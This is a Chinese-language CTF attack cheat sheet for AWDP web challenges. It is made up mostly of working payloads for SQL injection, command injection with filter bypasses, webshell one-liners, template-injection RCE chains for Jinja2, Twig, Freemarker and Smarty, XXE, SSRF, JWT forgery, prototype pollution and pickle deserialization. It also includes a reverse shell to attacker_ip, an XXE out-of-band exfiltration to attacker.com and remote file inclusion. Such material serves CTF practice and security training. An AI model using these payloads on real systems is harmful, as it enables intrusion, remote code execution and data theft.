# AWDP Break 攻击篇 — Web 方向

## 一、拿到题目后的第一步

1. **下载附件**，通常是一个 Web 应用的源码包
2. **快速判断语言和框架**：
   - 看文件后缀：`.php` / `.py` / `.js` / `.java`
   - 看配置文件：`composer.json`(PHP) / `requirements.txt`(Python) / `package.json`(Node) / `pom.xml`(Java)
   - 看入口文件：`index.php` / `app.py` / `server.js` / `Application.java`
3. **搜索危险函数**（见下方各语言清单）
4. **理清路由和功能点**，找到用户可控输入的地方

## 二、SQL 注入

### 识别特征
- 代码中直接拼接 SQL 语句
- 使用 `$_GET` / `$_POST` / `request.args` 等用户输入直接进入查询

### PHP 常见漏洞代码
```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = '$id'";
$result = mysqli_query($conn, $sql);
```

### 常用 Payload

```
# 万能密码
admin' OR '1'='1' --
admin' OR '1'='1' #
' OR 1=1 --

# Union 注入（先判断列数）
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
' UNION SELECT 1,2,3 --
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag' --
' UNION SELECT 1,group_concat(flag),3 FROM flag --

# 报错注入
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --

# 盲注
' AND (SELECT LENGTH(database()))>5 --
' AND (SELECT SUBSTRING(database(),1,1))='c' --

# 时间盲注
' AND IF(1=1,SLEEP(3),0) --
' AND IF((SELECT LENGTH(database()))>5,SLEEP(3),0) --

# 堆叠注入
';SELECT * FROM flag;--
```

## 三、命令注入 / RCE

### 识别特征（危险函数）

| 语言 | 危险函数 |
|------|----------|
| PHP | `system()` `exec()` `passthru()` `shell_exec()` `popen()` `proc_open()` `` `反引号` `` `eval()` `assert()` `preg_replace(/e)` |
| Python | `os.system()` `os.popen()` `subprocess.*` `eval()` `exec()` `__import__('os')` |
| Node.js | `child_process.exec()` `eval()` `Function()` `require('child_process')` |
| Java | `Runtime.getRuntime().exec()` `ProcessBuilder` |

### 常用 Payload

```bash
# 基础命令执行
;cat /flag
|cat /flag
`cat /flag`
$(cat /flag)

# 绕过空格过滤
cat${IFS}/flag
cat$IFS$9/flag
{cat,/flag}
cat</flag
cat%09/flag

# 绕过关键字过滤
c''at /flag
c""at /flag
c\at /fl\ag
/bin/ca? /fla?
echo Y2F0IC9mbGFn | base64 -d | bash

# 绕过长度限制（写文件分段执行）
echo cat>/tmp/1
echo ' /flag'>>/tmp/1
sh /tmp/1

# PHP 特有
<?php system($_GET['cmd']); ?>
<?=`$_GET[1]`?>
```

## 四、文件上传漏洞

### 识别特征
- 存在文件上传功能
- 后端校验不严格（只检查 Content-Type / 后缀名黑名单不全）

### 常用绕过方法

```
# 修改 Content-Type
Content-Type: image/png

# 后缀绕过（PHP）
.php3 .php5 .phtml .pht .phps .phar
.PHP .Php（Windows 不区分大小写）

# .htaccess 利用
上传 .htaccess 内容：
AddType application/x-httpd-php .jpg

# 00 截断（老版本 PHP < 5.3.4）
filename="shell.php%00.jpg"

# 双写绕过
filename="shell.pphphp"
```

### Webshell 一句话

```php
<?php eval($_POST['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?=`$_GET[1]`?>
```

## 五、SSTI（服务端模板注入）

### 识别特征
- Python Flask/Jinja2、Java Thymeleaf/Freemarker、PHP Twig/Smarty
- 用户输入被直接渲染到模板中

### 检测 Payload
```
{{7*7}}        → 如果返回 49，存在 SSTI
${7*7}         → Java 模板引擎
<%= 7*7 %>     → ERB (Ruby)
```

### Jinja2 (Python Flask) RCE Payload

```python
# 读文件
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('/flag').read()}}

# 命令执行（常用链）
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}

{{''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}

# lipsum 技巧
{{lipsum.__globals__['os'].popen('cat /flag').read()}}

# 绕过过滤
{{lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat /flag")|attr("read")()}}

# 绕过 {{ }} 过滤 — 用 {% %}
{% if ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read() %}1{% endif %}

# 绕过 . 过滤 — 用 [] 或 |attr()
{{''['__class__']['__mro__'][1]['__subclasses__']()}}

# 绕过 _ 过滤 — 用 \x5f 或 request.args
{{()|attr(request.args.a)|attr(request.args.b)}}  &a=__class__&b=__mro__

# 绕过引号过滤 — 用 request 对象
{{lipsum|attr(request.args.g)|attr(request.args.gi)(request.args.o)|attr(request.args.p)(request.args.c)|attr(request.args.r)()}}
&g=__globals__&gi=__getitem__&o=os&p=popen&c=cat /flag&r=read
```

### Twig (PHP) RCE Payload

```php
// 检测
{{7*7}}  → 49

// 读文件
{{'/flag'|file_excerpt(0,100)}}

// 命令执行（Twig 1.x）
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

// Twig 3.x（_self.env 不再可用）
{{['cat /flag']|filter('system')}}
{{['cat /flag']|map('system')}}
{{['cat /flag']|sort('system')}}
{{['cat /flag']|reduce('system')}}
```

### Freemarker (Java) RCE Payload

```java
// 检测
${7*7}  → 49

// 命令执行
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}

// 读文件
<#assign is=object?api.class.getResource("/flag").openStream()>
<#assign reader=object?api.class.forName("java.io.InputStreamReader").getConstructor(object?api.class.forName("java.io.InputStream")).newInstance(is)>

// ObjectConstructor
<#assign oc=object?api.class.forName("freemarker.template.utility.ObjectConstructor")?new()>
${oc("java.lang.ProcessBuilder", ["cat","/flag"]).start()}
```

### Smarty (PHP) RCE Payload

```php
// 检测
{7*7}  → 49

// 命令执行
{system('cat /flag')}
{if system('cat /flag')}{/if}

// Smarty 3 沙箱绕过
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('cat /flag');?>",self::clearConfig())}
```

## 六、PHP 反序列化

### 识别特征
- 代码中有 `unserialize()` 且参数可控
- 存在 `__destruct()` / `__wakeup()` / `__toString()` 等魔术方法

### 利用思路
1. 找到 `unserialize()` 的入口点
2. 审计类中的魔术方法，构造 POP 链
3. 生成序列化 payload

### 常见魔术方法触发顺序
```
unserialize() → __wakeup() → ... → __destruct()
echo $obj     → __toString()
$obj()        → __invoke()
$obj->xxx     → __get()
$obj->xxx=1   → __set()
$obj->xxx()   → __call()
```

## 七、SSRF（服务端请求伪造）

### 识别特征
- 代码中有 `curl`、`file_get_contents()`、`requests.get()` 等，且 URL 参数可控

### 常用 Payload
```
# 访问内网
http://127.0.0.1/flag
http://localhost/flag

# file 协议读文件
file:///flag
file:///etc/passwd

# gopher 协议打内网服务
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...

# 绕过 127.0.0.1 过滤
http://0x7f000001/flag
http://0177.0.0.1/flag
http://2130706433/flag
http://127.1/flag
http://[::1]/flag
```

## 八、XXE（XML 外部实体注入）

### 识别特征
- 应用解析用户提交的 XML 数据
- 使用 `simplexml_load_string()`、`DOMDocument`、`SAXParser` 等
- 接口 Content-Type 为 `application/xml` 或 `text/xml`

### 常用 Payload

```xml
<!-- 读取文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root><data>&xxe;</data></root>

<!-- 读取 PHP 源码（base64 编码避免解析错误） -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root><data>&xxe;</data></root>

<!-- SSRF — 探测内网 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">
]>
<root><data>&xxe;</data></root>

<!-- Blind XXE — 外带数据（OOB） -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root><data>&send;</data></root>

<!-- attacker.com/evil.dtd 内容: -->
<!-- <!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>"> -->
<!-- %all; -->
```

## 九、JWT 伪造

### 识别特征
- 应用使用 JWT（JSON Web Token）做身份认证
- Cookie 或 Header 中有 `eyJ` 开头的 base64 字符串

### 常用攻击方式

```bash
# 1. 算法置空攻击（alg: none）
# 将 header 中的 alg 改为 "none"，删除签名部分
# 适用于后端未严格校验算法的情况

# 用 python 构造：
import jwt
token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")

# 2. 密钥爆破（弱密钥）
# 工具：jwt-cracker / hashcat
hashcat -a 0 -m 16500 jwt.txt rockyou.txt

# 3. RS256 → HS256 算法混淆
# 如果服务端用 RS256（非对称），但也接受 HS256（对称）
# 用公钥作为 HS256 的密钥来签名
import jwt
public_key = open('public.pem').read()
token = jwt.encode({"user": "admin"}, public_key, algorithm="HS256")

# 4. kid 注入
# header 中的 kid 字段可能存在 SQL 注入或目录穿越
# kid: "../../dev/null"  → 密钥为空
# kid: "' union select 'secret' -- "  → 控制密钥值
```

### 工具
```bash
# jwt_tool — JWT 瑞士军刀
python3 jwt_tool.py <token> -T    # 篡改 payload
python3 jwt_tool.py <token> -C -d rockyou.txt  # 爆破密钥
python3 jwt_tool.py <token> -X a  # alg:none 攻击
python3 jwt_tool.py <token> -X k  # key confusion 攻击
```

## 十、Node.js 原型链污染

### 识别特征
- Node.js/Express 应用
- 存在对象合并操作：`merge()`、`Object.assign()`、`lodash.merge()`、`_.defaultsDeep()`
- 用户输入被递归合并到对象中

### 攻击原理
```javascript
// 通过 __proto__ 污染 Object.prototype
// 所有对象都会继承被污染的属性

// 漏洞代码示例
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
```

### 常用 Payload
```json
// POST JSON 请求体
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// 配合 EJS 模板引擎 RCE
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag');x"}}

// 配合 Pug 模板引擎 RCE
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('cat /flag')"}}}

// 配合 Handlebars RCE
{"__proto__": {"allowProtoMethodsByDefault": true, "allowProtoPropertiesByDefault": true}}
```

## 十一、Python Pickle 反序列化

### 识别特征
- 代码中有 `pickle.loads()`、`pickle.load()`、`cPickle.loads()`
- 用户输入被反序列化（通常是 base64 编码后传入）

### RCE Payload
```python
import pickle
import base64
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /flag',))

# 生成 payload
payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)

# 反弹 shell 版本
class ReverseShell(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/attacker_ip/9999 0>&1"',))

# 如果 os 被过滤，用 subprocess
class Bypass(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['cat', '/flag'],))

# 如果 __reduce__ 被限制，用 __setstate__
class Exploit2(object):
    def __setstate__(self, state):
        os.system(state)
    def __getstate__(self):
        return 'cat /flag'
```

## 十二、文件包含

### PHP 文件包含
```php
// 漏洞代码
include($_GET['file']);
```

### 常用 Payload
```
# 读源码
?file=php://filter/read=convert.base64-encode/resource=index.php

# 远程包含（需要 allow_url_include=On）
?file=http://attacker.com/shell.txt

# 日志包含
?file=/var/log/apache2/access.log
# 先在 User-Agent 中写入 PHP 代码

# data 协议
?file=data://text/plain,<?php system('cat /flag');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==

# phar 协议（配合反序列化）
?file=phar://upload/shell.phar
```
